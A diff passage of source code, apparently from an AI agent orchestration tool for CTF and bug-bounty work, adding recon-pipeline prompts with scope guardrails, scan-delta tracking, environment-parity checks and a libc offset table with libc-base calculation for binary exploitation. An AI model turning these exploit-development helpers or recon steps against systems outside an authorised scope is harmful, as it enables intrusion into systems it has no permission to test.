+    purpose: "Patch binary to match remote libc/loader",
+    outputParser: "patchelf_exit_status"
+  };
+}
+function recommendedTools(targetType) {
+  switch (targetType) {
+    case "PWN":
+      return [
+        checksecCommand("<binary>"),
+        ropgadgetCommand("<binary>", { depth: 12, filter: "pop|ret|syscall" }),
+        oneGadgetCommand("<libc.so.6>"),
+        patchelfCommand("<binary>", "<libc.so.6>", "<ld-linux-x86-64.so.2>")
+      ];
+    case "REV":
+      return [checksecCommand("<binary>"), binwalkCommand("<artifact>", true), exiftoolCommand("<artifact>")];
+    case "FORENSICS":
+      return [binwalkCommand("<image_or_dump>", true), exiftoolCommand("<image_or_media>")];
+    case "CRYPTO":
+      return [
+        rsactftoolCommand({ n: "<n>", e: "<e>", c: "<ciphertext>" }),
+        {
+          tool: "z3",
+          command: "python3 solve.py",
+          purpose: "Run symbolic solver constraints",
+          outputParser: "z3_sat_unsat_regex"
+        }
+      ];
+    case "WEB_API":
+    case "WEB3":
+      return [nucleiCommand("<target>", { rateLimit: DEFAULT_NUCLEI_RATE_LIMIT })];
+    case "MISC":
+    case "UNKNOWN":
+    default:
+      return [binwalkCommand("<target>"), exiftoolCommand("<target>")];
+  }
+}
+
+// src/orchestration/recon-pipeline.ts
+function normalizeScope(scope, fallbackTarget) {
+  const cleaned = (scope ?? []).map((item) => item.trim()).filter(Boolean);
+  if (cleaned.length > 0) {
+    return cleaned;
+  }
+  return [fallbackTarget.trim() || "<target>"];
+}
+function buildGuardrailBlock(target, scope, scopeConfirmed) {
+  const inScope = normalizeScope(scope, target);
+  return [
+    "Scope constraints:",
+    `- In-scope assets only: ${inScope.join(", ")}`,
+    scopeConfirmed ? "- Scope status: confirmed; still avoid out-of-scope pivots." : "- Scope status: unconfirmed; keep actions conservative and scope-safe.",
+    "- Do not test third-party or unknown assets.",
+    "Rate limiting reminders:",
+    "- Use low request rates and small batches.",
+    "- Back off immediately on 429/5xx spikes or instability."
+  ].join(`
+`);
+}
+function withGuardrails(prompt, target, scope, scopeConfirmed) {
+  return `${prompt}
+
+${buildGuardrailBlock(target, scope, scopeConfirmed)}`;
+}
+function planAssetDiscovery(target, scope) {
+  const tracks = [
+    {
+      purpose: "asset-discovery-subdomains",
+      agent: "bounty-triage",
+      prompt: withGuardrails([
+        `[BOUNTY Recon Phase 1: Asset Discovery]`,
+        `Target: ${target}`,
+        "Enumerate candidate subdomains with passive-first methods and deduplicate results.",
+        "Output should include: discovered assets, confidence, and one safest next recon step."
+      ].join(`
+`), target, scope)
+    },
+    {
+      purpose: "asset-discovery-ports",
+      agent: "bounty-triage",
+      prompt: withGuardrails([
+        `[BOUNTY Recon Phase 1: Asset Discovery]`,
+        `Target: ${target}`,
+        "Perform conservative host/port triage on confirmed in-scope hosts.",
+        "Prioritize lightweight checks and summarize live services by risk relevance."
+      ].join(`
+`), target, scope)
+    }
+  ];
+  return {
+    phase: 1,
+    name: "Asset Discovery",
+    tracks
+  };
+}
+function planLiveHostTriage(target) {
+  const tracks = [
+    {
+      purpose: "live-host-http-probing",
+      agent: "bounty-triage",
+      prompt: withGuardrails([
+        `[BOUNTY Recon Phase 2: Live Host Triage]`,
+        `Target: ${target}`,
+        "Probe candidate hosts for live HTTP(S) services and prioritize reachable assets.",
+        "Capture status code clusters, titles, and high-value endpoints only."
+      ].join(`
+`), target)
+    },
+    {
+      purpose: "live-host-tech-detection",
+      agent: "bounty-triage",
+      prompt: withGuardrails([
+        `[BOUNTY Recon Phase 2: Live Host Triage]`,
+        `Target: ${target}`,
+        "Fingerprint technologies/frameworks with low-impact techniques.",
+        "Map likely attack surface categories without active exploitation."
+      ].join(`
+`), target)
+    }
+  ];
+  return {
+    phase: 2,
+    name: "Live Host Triage",
+    tracks
+  };
+}
+function planContentDiscovery(target) {
+  const tracks = [
+    {
+      purpose: "content-discovery-crawl",
+      agent: "bounty-research",
+      prompt: withGuardrails([
+        `[BOUNTY Recon Phase 3: Content Discovery]`,
+        `Target: ${target}`,
+        "Crawl known live hosts to discover endpoints, parameters, and API paths.",
+        "Prioritize authenticated boundary indicators and sensitive data flows."
+      ].join(`
+`), target)
+    },
+    {
+      purpose: "content-discovery-directories",
+      agent: "bounty-research",
+      prompt: withGuardrails([
+        `[BOUNTY Recon Phase 3: Content Discovery]`,
+        `Target: ${target}`,
+        "Run focused directory/content discovery with conservative wordlists and cadence.",
+        "Report only high-signal findings and likely validation paths."
+      ].join(`
+`), target)
+    }
+  ];
+  return {
+    phase: 3,
+    name: "Content Discovery",
+    tracks
+  };
+}
+function planVulnScan(target) {
+  const tracks = [
+    {
+      purpose: "vuln-scan-nuclei-focused",
+      agent: "bounty-research",
+      prompt: withGuardrails([
+        `[BOUNTY Recon Phase 4: Vulnerability Scan]`,
+        `Target: ${target}`,
+        "Run focused vulnerability checks aligned to discovered technologies/assets.",
+        "Prefer high-confidence templates/checks over broad noisy scanning."
+      ].join(`
+`), target)
+    },
+    {
+      purpose: "vuln-scan-focused-manual",
+      agent: "bounty-research",
+      prompt: withGuardrails([
+        `[BOUNTY Recon Phase 4: Vulnerability Scan]`,
+        `Target: ${target}`,
+        "Design minimal-impact manual checks for top candidate weaknesses.",
+        "Return reproducible validation steps with strict scope safety."
+      ].join(`
+`), target)
+    }
+  ];
+  return {
+    phase: 4,
+    name: "Vulnerability Scan",
+    tracks
+  };
+}
+function planReconPipeline(state, config3, target, options) {
+  const normalizedTarget = target.trim() || "<target>";
+  const scopedAssets = normalizeScope(options?.scope, normalizedTarget);
+  const skip = new Set(options?.skipPhases ?? []);
+  const maxTracksPerPhase = typeof options?.maxTracksPerPhase === "number" && options.maxTracksPerPhase > 0 ? Math.floor(options.maxTracksPerPhase) : Number.MAX_SAFE_INTEGER;
+  const phases = [
+    planAssetDiscovery(normalizedTarget, scopedAssets),
+    planLiveHostTriage(normalizedTarget),
+    planContentDiscovery(normalizedTarget),
+    planVulnScan(normalizedTarget)
+  ].filter((phase) => !skip.has(phase.phase));
+  const scannerPolicyNote = config3.bounty_policy.deny_scanner_commands ? "Scanner restrictions may apply; prefer scoped, low-noise checks." : "Scanner restrictions are relaxed; still stay conservative and in-scope.";
+  const tracks = phases.flatMap((phase) => phase.tracks.slice(0, maxTracksPerPhase).map((track, index) => ({
+    purpose: `phase-${phase.phase}-${index + 1}-${track.purpose}`,
+    agent: track.agent,
+    prompt: `${track.prompt}
+
+Scope status at pipeline build: ${state.scopeConfirmed ? "confirmed" : "unconfirmed"}.
+Policy note: ${scannerPolicyNote}`
+  })));
+  const safeLabel = normalizedTarget.replace(/[^a-z0-9]+/gi, "-").replace(/^-+|-+$/g, "").toLowerCase() || "target";
+  return {
+    label: `bounty-recon-${safeLabel}`,
+    tracks
+  };
+}
+
+// src/orchestration/delta-scan.ts
+var scanHistory = new Map;
+function normalizeKey(target) {
+  return target.trim().toLowerCase();
+}
+function uniqueSorted(values) {
+  return [...new Set(values.map((value) => value.trim()).filter(Boolean))].sort((a, b) => a.localeCompare(b));
+}
+function summarizeDelta(delta) {
+  const parts = [
+    `newAssets=${delta.newAssets.length}`,
+    `removedAssets=${delta.removedAssets.length}`,
+    `newFindings=${delta.newFindings.length}`,
+    `resolvedFindings=${delta.resolvedFindings.length}`,
+    `templateChanged=${delta.templateChanged ? "yes" : "no"}`
+  ];
+  return `Delta: ${parts.join(", ")}`;
+}
+function saveScanSnapshot(snapshot) {
+  const key = normalizeKey(snapshot.target);
+  if (!key) {
+    return;
+  }
+  const entry = {
+    ...snapshot,
+    target: snapshot.target.trim(),
+    assets: uniqueSorted(snapshot.assets),
+    findings: uniqueSorted(snapshot.findings),
+    templateSet: snapshot.templateSet.trim()
+  };
+  const existing = scanHistory.get(key) ?? [];
+  existing.push(entry);
+  existing.sort((a, b) => a.timestamp - b.timestamp);
+  scanHistory.set(key, existing);
+}
+function getLatestSnapshot(target) {
+  const history = scanHistory.get(normalizeKey(target));
+  if (!history || history.length === 0) {
+    return null;
+  }
+  return history[history.length - 1] ?? null;
+}
+function computeDelta(previous, current) {
+  const previousAssets = new Set(uniqueSorted(previous.assets));
+  const currentAssets = new Set(uniqueSorted(current.assets));
+  const previousFindings = new Set(uniqueSorted(previous.findings));
+  const currentFindings = new Set(uniqueSorted(current.findings));
+  const newAssets = [...currentAssets].filter((asset) => !previousAssets.has(asset));
+  const removedAssets = [...previousAssets].filter((asset) => !currentAssets.has(asset));
+  const newFindings = [...currentFindings].filter((finding) => !previousFindings.has(finding));
+  const resolvedFindings = [...previousFindings].filter((finding) => !currentFindings.has(finding));
+  const templateChanged = previous.templateSet.trim() !== current.templateSet.trim();
+  const deltaWithoutSummary = {
+    newAssets: newAssets.sort((a, b) => a.localeCompare(b)),
+    removedAssets: removedAssets.sort((a, b) => a.localeCompare(b)),
+    newFindings: newFindings.sort((a, b) => a.localeCompare(b)),
+    resolvedFindings: resolvedFindings.sort((a, b) => a.localeCompare(b)),
+    templateChanged
+  };
+  return {
+    ...deltaWithoutSummary,
+    summary: summarizeDelta(deltaWithoutSummary)
+  };
+}
+function getScanHistory(target) {
+  const history = scanHistory.get(normalizeKey(target));
+  if (!history) {
+    return [];
+  }
+  return [...history];
+}
+function buildDeltaSummary(target, current) {
+  const history = getScanHistory(target);
+  if (history.length === 0) {
+    return `No previous snapshot found for ${target}. Current snapshot ${current.id} is treated as baseline.`;
+  }
+  const latest = history[history.length - 1];
+  const previous = latest && latest.id === current.id ? history[history.length - 2] : latest;
+  if (!previous) {
+    return `No prior snapshot before ${current.id} for ${target}. Current snapshot is baseline.`;
+  }
+  const delta = computeDelta(previous, current);
+  const detailParts = [];
+  if (delta.newAssets.length > 0) {
+    detailParts.push(`New assets: ${delta.newAssets.join(", ")}`);
+  }
+  if (delta.removedAssets.length > 0) {
+    detailParts.push(`Removed assets: ${delta.removedAssets.join(", ")}`);
+  }
+  if (delta.newFindings.length > 0) {
+    detailParts.push(`New findings: ${delta.newFindings.join(", ")}`);
+  }
+  if (delta.resolvedFindings.length > 0) {
+    detailParts.push(`Resolved findings: ${delta.resolvedFindings.join(", ")}`);
+  }
+  if (delta.templateChanged) {
+    detailParts.push(`Template set changed: ${previous.templateSet} -> ${current.templateSet}`);
+  }
+  const details = detailParts.length > 0 ? `
+${detailParts.join(`
+`)}` : `
+No material changes detected.`;
+  return `Target ${target} delta from ${previous.id} to ${current.id}: ${delta.summary}${details}`;
+}
+function shouldRescan(target, templateSet, maxAgeMs = 24 * 60 * 60 * 1000) {
+  const latest = getLatestSnapshot(target);
+  if (!latest) {
+    return true;
+  }
+  if (latest.templateSet.trim() !== templateSet.trim()) {
+    return true;
+  }
+  if (maxAgeMs <= 0) {
+    return true;
+  }
+  const ageMs = Date.now() - latest.timestamp;
+  return ageMs >= maxAgeMs;
+}
+
+// src/orchestration/libc-database.ts
+var COMMON_LIBCS = [
+  {
+    id: "libc6_2.31-0ubuntu9.9_amd64",
+    symbols: {
+      puts: 554400,
+      printf: 413312,
+      read: 1118512,
+      write: 1118672,
+      system: 349200,
+      execve: 941824,
+      str_bin_sh: 1799594,
+      __libc_start_main: 159680,
+      __free_hook: 2026280,
+      __malloc_hook: 2014064,
+      setcontext: 363776,
+      one_gadget_0: 945278,
+      one_gadget_1: 945281,
+      one_gadget_2: 945284
+    }
+  },
+  {
+    id: "libc6_2.27-3ubuntu1_amd64",
+    symbols: {
+      puts: 526784,
+      printf: 413200,
+      read: 1114224,
+      write: 1114432,
+      system: 324672,
+      execve: 937520,
+      str_bin_sh: 1785498,
+      __libc_start_main: 137904,
+      __free_hook: 4118760,
+      __malloc_hook: 4111408,
+      setcontext: 336144,
+      one_gadget_0: 324261,
+      one_gadget_1: 324354,
+      one_gadget_2: 1090300
+    }
+  },
+  {
+    id: "libc6_2.23-0ubuntu11.3_amd64",
+    symbols: {
+      puts: 456336,
+      printf: 350208,
+      read: 1012304,
+      write: 1012400,
+      system: 283536,
+      execve: 837488,
+      str_bin_sh: 1625431,
+      __libc_start_main: 132928,
+      __free_hook: 3958696,
+      __malloc_hook: 3951376,
+      setcontext: 293749,
+      one_gadget_0: 283158,
+      one_gadget_1: 283242,
+      one_gadget_2: 983716,
+      one_gadget_3: 987463
+    }
+  }
+];
+function parseAddress(value) {
+  const trimmed = value.trim().toLowerCase();
+  if (!trimmed) {
+    return null;
+  }
+  const normalized = trimmed.startsWith("0x") ? trimmed : `0x${trimmed}`;
+  if (!/^0x[0-9a-f]+$/.test(normalized)) {
+    return null;
+  }
+  try {
+    return BigInt(normalized);
+  } catch {
+    return null;
+  }
+}
+function normalizeSymbolName(name) {
+  return name.trim();
+}
+function safeQueryRequests(requests) {
+  if (!Array.isArray(requests)) {
+    return [];
+  }
+  const output = [];
+  for (const request of requests) {
+    const symbolName = normalizeSymbolName(request.symbolName ?? "");
+    const parsed = parseAddress(request.address ?? "");
+    if (!symbolName || parsed === null) {
+      continue;
+    }
+    output.push({
+      symbolName,
+      address: `0x${parsed.toString(16)}`
+    });
+  }
+  return output;
+}
+function symbolOffsetNibble(offset) {
+  return (offset & 4095).toString(16).padStart(3, "0");
+}
+function extractOffset(address) {
+  const parsed = parseAddress(address ?? "");
+  if (parsed === null) {
+    return "";
+  }
+  const nibbles = Number(parsed & BigInt(4095));
+  return nibbles.toString(16).padStart(3, "0");
+}
+function localLookup(requests) {
+  const query = safeQueryRequests(requests);
+  if (query.length === 0) {
+    return {
+      matches: [],
+      lookupSource: "local",
+      query: []
+    };
+  }
+  const matches = COMMON_LIBCS.filter((libc) => {
+    return query.every((request) => {
+      const symbolOffset = libc.symbols[request.symbolName];
+      if (typeof symbolOffset !== "number") {
+        return false;
+      }
+      return symbolOffsetNibble(symbolOffset) === extractOffset(request.address);
+    });
+  });
+  return {
+    matches,
+    lookupSource: "local",
+    query
+  };
+}
+function buildLibcRipUrl(requests) {
+  const query = safeQueryRequests(requests);
+  if (query.length === 0) {
+    return "https://libc.rip/";
+  }
+  const params = query.map((request) => `${encodeURIComponent(request.symbolName)}=${encodeURIComponent(extractOffset(request.address))}`).join("&");
+  return `https://libc.rip/api/find?${params}`;
+}
+function getUsefulOffsets(libc) {
+  const symbols = libc?.symbols ?? {};
+  const oneGadgetKeys = Object.keys(symbols).filter((key) => key.startsWith("one_gadget_")).sort();
+  const offsets = {
+    puts: symbols.puts ?? null,
+    printf: symbols.printf ?? null,
+    read: symbols.read ?? null,
+    write: symbols.write ?? null,
+    system: symbols.system ?? null,
+    execve: symbols.execve ?? null,
+    str_bin_sh: symbols.str_bin_sh ?? null,
+    __libc_start_main: symbols.__libc_start_main ?? null,
+    __free_hook: symbols.__free_hook ?? null,
+    __malloc_hook: symbols.__malloc_hook ?? null,
+    setcontext: symbols.setcontext ?? null
+  };
+  for (const key of oneGadgetKeys) {
+    offsets[key] = symbols[key] ?? null;
+  }
+  return offsets;
+}
+function buildLibcSummary(result) {
+  const queryText = result.query.map((q) => `${q.symbolName}@${extractOffset(q.address)}`).join(", ") || "none";
+  if (result.matches.length === 0) {
+    return [
+      `Libc lookup source: ${result.lookupSource}`,
+      `Query: ${queryText}`,
+      "No local libc candidates matched all provided leaked offsets."
+    ].join(`
+`);
+  }
+  const lines = [
+    `Libc lookup source: ${result.lookupSource}`,
+    `Query: ${queryText}`,
+    `Candidates: ${result.matches.length}`
+  ];
+  for (const libc of result.matches) {
+    const useful = getUsefulOffsets(libc);
+    lines.push(`- ${libc.id}${libc.buildId ? ` (buildId=${libc.buildId})` : ""}`, `  system=${useful.system ?? "n/a"} | /bin/sh=${useful.str_bin_sh ?? "n/a"} | __free_hook=${useful.__free_hook ?? "n/a"}`);
+  }
+  return lines.join(`
+`);
+}
+function computeLibcBase(leakedAddress, symbolOffset) {
+  const parsedLeak = parseAddress(leakedAddress ?? "");
+  if (parsedLeak === null || !Number.isFinite(symbolOffset) || symbolOffset < 0) {
+    return "";
+  }
+  const offset = BigInt(Math.trunc(symbolOffset));
+  if (parsedLeak < offset) {
+    return "";
+  }
+  const base = parsedLeak - offset;
+  return `0x${base.toString(16)}`;
+}
+
+// src/orchestration/env-parity.ts
+var UNKNOWN_VALUE = "unknown";
+function shellQuote3(value) {
+  return `'${value.replace(/'/g, `'"'"'`)}'`;
+}
+function normalizeArch(value) {
+  const normalized = (value ?? "").trim().toLowerCase();
+  if (!normalized) {
+    return;
+  }
+  if (["amd64", "x86_64", "x64"].includes(normalized)) {
+    return "x86_64";
+  }
+  if (["i386", "386", "x86"].includes(normalized)) {
+    return "i386";
+  }
+  if (["arm64", "aarch64"].includes(normalized)) {
+    return "aarch64";
+  }
+  return normalized;
+}
+function normalizeVersion(value) {
+  const input = (value ?? "").trim();
+  if (!input) {
+    return;
+  }
+  const match = input.match(/\d+\.\d+(?:\.\d+)?/);
+  return match?.[0];
+}
+function toDisplay(value) {
+  const normalized = value?.trim();
+  return normalized ? normalized : UNKNOWN_VALUE;
+}
+function trimOrUndefined(value) {
+  const normalized = value?.trim();
+  return normalized ? normalized : undefined;
+}
+function sanitizePath(rawPath) {
+  return rawPath.replace(/[)"']+$/g, "").trim();
+}
+function dockerPlatformFromArch(arch) {
+  const normalized = normalizeArch(arch);
+  if (!normalized) {
+    return;
+  }
+  if (normalized === "x86_64") {
+    return "linux/amd64";
+  }
+  if (normalized === "i386") {
+    return "linux/386";
+  }
+  if (normalized === "aarch64") {
+    return "linux/arm64";
+  }
+  return;
+}
+function parseDockerfile(content) {
+  const text = content.replace(/\r/g, "");
+  const result = {};
+  const fromMatch = text.match(/^FROM\s+(?:--platform=([^\s]+)\s+)?([^\s]+)(?:\s+AS\s+[^\s]+)?/im);
+  if (fromMatch) {
+    const platform = trimOrUndefined(fromMatch[1]);
+    const image = trimOrUndefined(fromMatch[2]);
+    if (image) {
+      result.dockerImage = image;
+      if (/python:(\d+\.\d+(?:\.\d+)?)/i.test(image)) {
+        const version3 = image.match(/python:(\d+\.\d+(?:\.\d+)?)/i)?.[1];
+        result.pythonVersion = normalizeVersion(version3);
+      }
+      if (/arm64|aarch64/i.test(image)) {
+        result.arch = "aarch64";
+      } else if (/amd64|x86_64/i.test(image)) {
+        result.arch = "x86_64";
+      }
+    }
+    if (platform) {
+      const archFromPlatform = platform.split("/").at(-1);
+      const normalized = normalizeArch(archFromPlatform);
+      if (normalized) {
+        result.arch = normalized;
+      }
+    }
+  }
+  const glibcMatches = [
+    text.match(/(?:GLIBC_VERSION|GLIBC)\s*[= ]\s*["']?([0-9]+\.[0-9]+(?:\.[0-9]+)?)/i)?.[1],
+    text.match(/libc6(?:[:=][^\s]+)?[= ]([0-9]+\.[0-9]+(?:\.[0-9]+)?)/i)?.[1],
+    text.match(/libc-([0-9]+\.[0-9]+(?:\.[0-9]+)?)\.so/i)?.[1]
+  ].map((value) => normalizeVersion(value)).filter((value) => Boolean(value));
+  if (glibcMatches.length > 0) {
+    result.libcVersion = glibcMatches[0];
+  }
+  const libcPathMatch = text.match(/(\/[^\s"']*libc(?:-[0-9.]+)?\.so(?:\.6)?)/i)?.[1];
+  if (libcPathMatch) {
+    result.libcPath = sanitizePath(libcPathMatch);
+  }
+  const ldPathMatch = text.match(/(\/[^\s"']*ld-linux[^\s"']*)/i)?.[1] ?? text.match(/(\/[^\s"']*ld-[^\s"']*\.so[^\s"']*)/i)?.[1];
+  if (ldPathMatch) {
+    result.ldPath = sanitizePath(ldPathMatch);
+  }
+  const pythonVersionMatch = text.match(/python(?:3)?(?:[:= ]|\s)([0-9]+\.[0-9]+(?:\.[0-9]+)?)/i)?.[1] ?? text.match(/python3\.[0-9]+/i)?.[0]?.replace(/^python/i, "");
+  if (pythonVersionMatch) {
+    result.pythonVersion = normalizeVersion(pythonVersionMatch);
+  }
+  const seccompMatch = text.match(/SECCOMP_PROFILE\s*=\s*["']?([^\s"']+)/i)?.[1] ?? text.match(/--security-opt\s+seccomp=([^\s]+)/i)?.[1];
+  if (seccompMatch) {
+    result.seccompProfile = seccompMatch.trim();
+  }
+  result.arch = normalizeArch(result.arch);
+  result.libcVersion = normalizeVersion(result.libcVersion);
+  return result;
+}
+function localEnvCommands() {
+  return [
+    "uname -m",
+    "ldd --version 2>&1 | head -n 1",
+    "python3 --version 2>&1 || python --version 2>&1",
+    "readlink -f /lib64/ld-linux-x86-64.so.2 2>/dev/null || readlink -f /lib/ld-linux.so.2 2>/dev/null || true",
+    "grep -E '^(NAME|VERSION)=' /etc/os-release 2>/dev/null || true"
+  ];
+}
+function parseLddOutput(output) {
+  const text = output.replace(/\r/g, "");
+  if (!text.trim()) {
+    return null;
+  }
+  const pathMatch = text.match(/libc\.so\.6\s*=>\s*(\/[^\s]+)\s*\(/i)?.[1] ?? text.match(/(\/[^\s]*libc(?:-[0-9.]+)?\.so(?:\.6)?)/i)?.[1];
+  const libcPath = trimOrUndefined(pathMatch ? sanitizePath(pathMatch) : undefined);
+  if (!libcPath) {
+    return null;
+  }
+  const version3 = normalizeVersion(text.match(/(?:GLIBC|GNU libc|ldd)[^0-9]*([0-9]+\.[0-9]+(?:\.[0-9]+)?)/i)?.[1]) ?? normalizeVersion(libcPath.match(/libc-([0-9]+\.[0-9]+(?:\.[0-9]+)?)\.so/i)?.[1]) ?? "unknown";
+  return { libcPath, version: version3 };
+}
+function generatePatchelfCommands(binaryPath, env) {
+  const commands = [];
+  const targetBinary = binaryPath.trim();
+  if (!targetBinary) {
+    return commands;
+  }
+  const ldPath = trimOrUndefined(env.ldPath);
+  const libcPath = trimOrUndefined(env.libcPath);
+  if (ldPath) {
+    commands.push(`patchelf --set-interpreter ${shellQuote3(ldPath)} ${shellQuote3(targetBinary)}`);
+  }
+  if (libcPath) {
+    commands.push(`patchelf --replace-needed libc.so.6 ${shellQuote3(libcPath)} ${shellQuote3(targetBinary)}`);
+    const slashIndex = libcPath.lastIndexOf("/");
+    if (slashIndex > 0) {
+      const libcDir = libcPath.slice(0, slashIndex);
+      commands.push(`patchelf --set-rpath ${shellQuote3(libcDir)} ${shellQuote3(targetBinary)}`);
+    }
+  }
+  return commands;
+}
+function buildParityReport(local, remote) {
+  const checks5 = [];
+  const normalizedLocalArch = normalizeArch(local.arch);
+  const normalizedRemoteArch = normalizeArch(remote.arch);
+  const normalizedLocalLibc = normalizeVersion(local.libcVersion) ?? trimOrUndefined(local.libcPath);
+  const normalizedRemoteLibc = normalizeVersion(remote.libcVersion) ?? trimOrUndefined(remote.libcPath);
+  const addCheck = (args) => {
+    const localDisplay = toDisplay(args.localValue);
+    const remoteDisplay = toDisplay(args.remoteValue);
+    const match = localDisplay === UNKNOWN_VALUE && remoteDisplay === UNKNOWN_VALUE ? true : localDisplay !== UNKNOWN_VALUE && remoteDisplay !== UNKNOWN_VALUE && localDisplay === remoteDisplay;
+    checks5.push({
+      aspect: args.aspect,
+      local: localDisplay,
+      remote: remoteDisplay,
+      match,
+      fixCommand: match ? undefined : args.fixCommand
+    });
+  };
+  addCheck({
+    aspect: "arch",
+    localValue: normalizedLocalArch,
+    remoteValue: normalizedRemoteArch,
+    fixCommand: normalizedRemoteArch !== undefined ? `Use docker platform ${dockerPlatformFromArch(normalizedRemoteArch) ?? normalizedRemoteArch} for execution parity.` : undefined
+  });
+  addCheck({
+    aspect: "libc",
+    localValue: normalizedLocalLibc,
+    remoteValue: normalizedRemoteLibc,
+    fixCommand: remote.libcPath || remote.ldPath ? generatePatchelfCommands("<binary>", {
+      arch: normalizedRemoteArch ?? "unknown",
+      libcPath: trimOrUndefined(remote.libcPath),
+      ldPath: trimOrUndefined(remote.ldPath),
+      libcVersion: normalizeVersion(remote.libcVersion)
+    }).join(" && ") : undefined
+  });
+  addCheck({
+    aspect: "ld",
+    localValue: trimOrUndefined(local.ldPath),
+    remoteValue: trimOrUndefined(remote.ldPath),
+    fixCommand: remote.ldPath?.trim() ? `patchelf --set-interpreter ${shellQuote3(remote.ldPath.trim())} <binary>` : undefined
+  });
+  addCheck({
+    aspect: "python",
+    localValue: normalizeVersion(local.pythonVersion) ?? trimOrUndefined(local.pythonVersion),
+    remoteValue: normalizeVersion(remote.pythonVersion) ?? trimOrUndefined(remote.pythonVersion),
+    fixCommand: remote.pythonVersion?.trim() ? `pyenv install ${remote.pythonVersion.trim()} && pyenv local ${remote.pythonVersion.trim()}` : undefined
+  });
+  addCheck({
+    aspect: "seccomp",
+    localValue: trimOrUndefined(local.seccompProfile),
+    remoteValue: trimOrUndefined(remote.seccompProfile),
+    fixCommand: remote.seccompProfile?.trim() ? `docker run --security-opt seccomp=${shellQuote3(remote.seccompProfile.trim())} ...` : undefined
+  });
+  const fixCommands = Array.from(new Set(checks5.filter((check3) => !check3.match && check3.fixCommand).map((check3) => check3.fixCommand).map((command) => command.trim()).filter(Boolean)));
+  const allMatch = checks5.every((check3) => check3.match);
+  const summaryLines = [`Parity checks: ${checks5.filter((check3) => check3.match).length}/${checks5.length} matched.`];
+  if (allMatch) {
+    summaryLines.push("Local and remote environment appear aligned for tracked aspects.");
+  } else {
+    const mismatches = checks5.filter((check3) => !check3.match).map((check3) => check3.aspect);
+    summaryLines.push(`Mismatched aspects: ${mismatches.join(", ")}.`);
+    if (fixCommands.length > 0) {
+      summaryLines.push(`Suggested fixes: ${fixCommands.length} command(s) generated.`);
+    }
+  }
+  return {
+    checks: checks5,
+    allMatch,
+    fixCommands,
+    summary: summaryLines.join(" ")
+  };
+}
+function buildParitySummary(report) {
+  const lines = [report.summary];
+  for (const check3 of report.checks) {
+    const status = check3.match ? "OK" : "MISMATCH";
+    lines.push(`- [${status}] ${check3.aspect}: local=${check3.local} remote=${check3.remote}`);
+  }
+  if (!report.allMatch && report.fixCommands.length > 0) {
+    lines.push("Fix commands:");
+    for (const command of report.fixCommands) {
+      lines.push(`- ${command}`);
+    }
+  }
+  return lines.join(`
+`);
+}
+
+// src/orchestration/report-generator.ts
+function trimLine(line) {
+  return line.trim();
+}
+function stripListPrefix(line) {
+  return line.replace(/^[-*]\s+/, "").replace(/^\d+\.\s+/, "").trim();
+}
+function stripHeadingPrefix(line) {
+  return line.replace(/^#{1,6}\s+/, "").trim();
+}
+function cleanupArtifactToken(value) {
+  return value.trim().replace(/^[<("']+/, "").replace(/[>)"',.;:]+$/, "");
+}
+function extractTimestamp(line) {
+  const bracketed = line.match(/^\[([^\]]+)\]\s*(.*)$/);
+  if (bracketed) {
+    return {
+      timestamp: bracketed[1].trim(),
+      rest: bracketed[2].trim()
+    };
+  }
+  const isoLike = line.match(/^(\d{4}[-/]\d{2}[-/]\d{2}(?:[ T]\d{2}:\d{2}(?::\d{2})?(?:\s*(?:UTC|KST|[A-Z]{2,5}|[+-]\d{2}:?\d{2}))?)?)\s*(?:[-:|])?\s*(.*)$/);
+  if (isoLike) {
+    return {
+      timestamp: isoLike[1].trim(),
+      rest: isoLike[2].trim()
+    };
+  }
+  const timeOnly = line.match(/^(\d{2}:\d{2}(?::\d{2})?)\s*(?:[-:|])?\s*(.*)$/);
+  if (timeOnly) {
+    return {
+      timestamp: timeOnly[1].trim(),
+      rest: timeOnly[2].trim()
+    };
+  }
+  return { rest: line };
+}
+function splitActionResult(line) {
+  const delimiters = ["=>", "->", "|"];
+  for (const delimiter of delimiters) {
+    const index = line.indexOf(delimiter);
+    if (index > 0) {
+      const action = line.slice(0, index).trim();
+      const result = line.slice(index + delimiter.length).trim();
+      return {
+        action: action || "log",
+        result: result || "not specified"
+      };
+    }
+  }
+  const keyValue = line.match(/^(?:action|tried|step)\s*:\s*(.+?)(?:\s+(?:result|observed|outcome|status)\s*:\s*(.+))?$/i);
+  if (keyValue) {
+    return {
+      action: keyValue[1].trim(),
+      result: keyValue[2]?.trim() || "not specified"
+    };
+  }
+  const resultOnly = line.match(/^(?:result|observed|outcome|status)\s*:\s*(.+)$/i);
+  if (resultOnly) {
+    return {
+      action: "observation",
+      result: resultOnly[1].trim()
+    };
+  }
+  const embeddedResult = line.match(/^(.+?)\s+(?:result|observed|outcome|status)\s*:\s*(.+)$/i);
+  if (embeddedResult) {
+    return {
+      action: embeddedResult[1].trim(),
+      result: embeddedResult[2].trim()
+    };
+  }
+  return {
+    action: line.trim() || "log",
+    result: "not specified"
+  };
+}
+function extractArtifactPaths(content) {
+  const artifacts = new Set;
+  const inlineCodePattern = /`([^`]+)`/g;
+  for (const match of content.matchAll(inlineCodePattern)) {
+    const candidate = cleanupArtifactToken(match[1]);
+    if (/[/\\]/.test(candidate) || /\.[a-zA-Z0-9]{1,8}$/.test(candidate)) {
+      artifacts.add(candidate);
+    }
+  }
+  const markdownLinkPattern = /\[[^\]]+\]\(([^)]+)\)/g;
+  for (const match of content.matchAll(markdownLinkPattern)) {
+    const candidate = cleanupArtifactToken(match[1]);
+    if (candidate) {
+      artifacts.add(candidate);
+    }
+  }
+  const pathPattern = /(?:^|\s)(\.?\/?[A-Za-z0-9_.-]+(?:\/[A-Za-z0-9_.-]+)+)/g;
+  for (const match of content.matchAll(pathPattern)) {
+    const candidate = cleanupArtifactToken(match[1]);
+    if (candidate && !/^https?:\/\//i.test(candidate)) {
+      artifacts.add(candidate);
+    }
+  }
+  return Array.from(artifacts);
+}
+function isEntryBoundary(line) {
+  return /^#{2,6}\s+/.test(line) || /^[-*]\s+/.test(line) || /^\d+\.\s+/.test(line);
+}
+function finalizeEvidenceBlock(blockLines) {
+  const cleaned = blockLines.map((line) => trimLine(line)).filter(Boolean);
+  if (cleaned.length === 0) {
+    return null;
+  }
+  const firstLine = stripHeadingPrefix(stripListPrefix(cleaned[0]));
+  const item = firstLine || "Evidence item";
+  const verificationLine = cleaned.map((line) => stripHeadingPrefix(stripListPrefix(line))).find((line) => /\b(verified|verification|status|result|accepted|correct|impact|severity)\b/i.test(line)) ?? cleaned[1] ?? "Verification details not specified.";
+  return {
+    item,
+    verification: stripHeadingPrefix(stripListPrefix(verificationLine)),
